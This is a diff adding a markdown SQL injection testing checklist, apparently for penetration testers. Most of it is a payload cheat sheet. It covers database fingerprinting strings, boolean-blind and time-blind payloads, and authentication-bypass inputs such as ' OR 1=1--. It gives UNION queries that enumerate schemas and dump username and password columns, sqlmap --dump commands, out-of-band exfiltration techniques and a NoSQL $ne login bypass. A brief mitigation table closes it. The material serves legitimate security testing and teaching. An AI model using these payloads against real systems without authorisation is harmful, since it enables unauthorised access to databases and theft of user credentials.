@@ -1,0 +1,139 @@
+# ✅ Complete SQL Injection (SQLi) Checklist
+
+---
+
+## 🧭 **PHASE 1: RECONNAISSANCE**
+
+### 🔹 1.1 Identify Potential Entry Points
+- [ ] Input fields (login, search, contact forms)
+- [ ] URL parameters (e.g., `?id=1`)
+- [ ] Hidden form fields
+- [ ] Cookies (e.g., `session_id`, `lang`)
+- [ ] HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
+- [ ] JSON body in API requests
+- [ ] GraphQL queries and variables
+
+### 🔹 1.2 Fingerprint the Database
+Use payloads or tools to detect the backend database:
+
+| DBMS      | Detection Payload                              |
+|-----------|------------------------------------------------|
+| MySQL     | `' AND 1=2 UNION SELECT @@version--`          |
+| MSSQL     | `' AND 1=2 UNION SELECT @@version--`          |
+| PostgreSQL| `' AND 1=2 UNION SELECT version()--`          |
+| Oracle    | `' OR 1=1 AND ROWNUM = 1--`                   |
+
+---
+
+## 🔬 **PHASE 2: INITIAL TESTING & DETECTION**
+
+### 🔹 2.1 Basic Payloads (Classic SQLi)
+- [ ] `'`
+- [ ] `'-- `
+- [ ] `" OR "1"="1"`
+- [ ] `' OR 1=1--`
+- [ ] `admin'--`
+- [ ] `1' OR '1'='1'--`
+
+### 🔹 2.2 Boolean-Based Blind SQLi
+- [ ] `1' AND 1=1--` ✅ (True)
+- [ ] `1' AND 1=2--` ❌ (False)
+
+Observe difference in response (page load, messages, data shown).
+
+### 🔹 2.3 Time-Based Blind SQLi
+| DBMS      | Payload Example                    |
+|-----------|------------------------------------|
+| MySQL     | `' OR IF(1=1, SLEEP(5), 0)--`       |
+| PostgreSQL| `' OR pg_sleep(5)--`               |
+| MSSQL     | `' WAITFOR DELAY '0:0:5'--`         |
+
+Measure delay to infer SQLi presence.
+
+---
+
+## 💣 **PHASE 3: EXPLOITATION**
+
+### 🔹 3.1 Bypass Authentication
+- [ ] `' OR '1'='1'--`
+- [ ] `' OR 1=1--`
+- [ ] `' OR '' = '` (bypass filters)
+
+### 🔹 3.2 Extract DB Info (Manual)
+#### 🔸 Database Version:
+- [ ] `UNION SELECT @@version--`
+- [ ] `UNION SELECT version()--`
+
+#### 🔸 Current User:
+- [ ] `UNION SELECT user()--` (MySQL, PostgreSQL)
+- [ ] `SELECT SYSTEM_USER--` (MSSQL)
+
+#### 🔸 Database Names (MySQL):
+```sql
+' UNION SELECT schema_name FROM information_schema.schemata--
+```
+
+#### 🔸 Table Names:
+```sql
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='target_db'--
+```
+
+#### 🔸 Column Names:
+```sql
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+```
+
+#### 🔸 Dump Data:
+```sql
+' UNION SELECT username, password FROM users--
+```
+
+---
+
+## ⚙️ **PHASE 4: AUTOMATION (Tools)**
+
+### 🔹 4.1 Use sqlmap
+```bash
+sqlmap -u "http://site.com/page.php?id=1" --dbs
+sqlmap -u "http://site.com/page.php?id=1" --dump -D target_db -T users
+```
+- [ ] Use `--cookie`, `--data`, or `-p` if needed.
+- [ ] Add `--risk 3 --level 5` for deeper testing.
+- [ ] `--batch` for non-interactive
+
+### 🔹 4.2 Use Burp Suite
+- [ ] Intercept and send requests to **Repeater**.
+- [ ] Inject payloads and compare responses.
+- [ ] Use **Intruder** for automated fuzzing.
+- [ ] Add **Collaborator** for OOB SQLi detection.
+
+---
+
+## 🧨 **PHASE 5: ADVANCED & RARE CASES**
+
+### 🔹 5.1 Second-Order SQLi
+- [ ] Inject data into a non-SQL processing input
+- [ ] Check if it’s later used in a SQL query
+
+### 🔹 5.2 Out-of-Band SQLi (OOB)
+- [ ] Use `LOAD_FILE()`, `xp_dirtree`, `dns`/HTTP requests to your server
+- [ ] Use Burp Collaborator or your own DNS/HTTP logging endpoint
+
+### 🔹 5.3 NoSQL Injection (MongoDB etc.)
+- [ ] `{ "username": {"$ne": null}, "password": {"$ne": null} }`
+
+---
+
+## 🛡️ **PHASE 6: MITIGATION CHECKLIST**
+
+| Item                              | Should Be Done ✅ |
+|-----------------------------------|------------------|
+| Use parameterized queries / prepared statements | ✅ |
+| Use ORM securely (e.g., avoid raw SQL)          | ✅ |
+| Sanitize and validate user input (whitelist)   | ✅ |
+| Implement least privilege on DB accounts       | ✅ |
+| Do not expose detailed error messages          | ✅ |
+| Apply WAF (Web Application Firewall)           | ✅ |
+| Regularly scan with tools (e.g., Nikto, sqlmap, Acunetix) | ✅ |
+
+
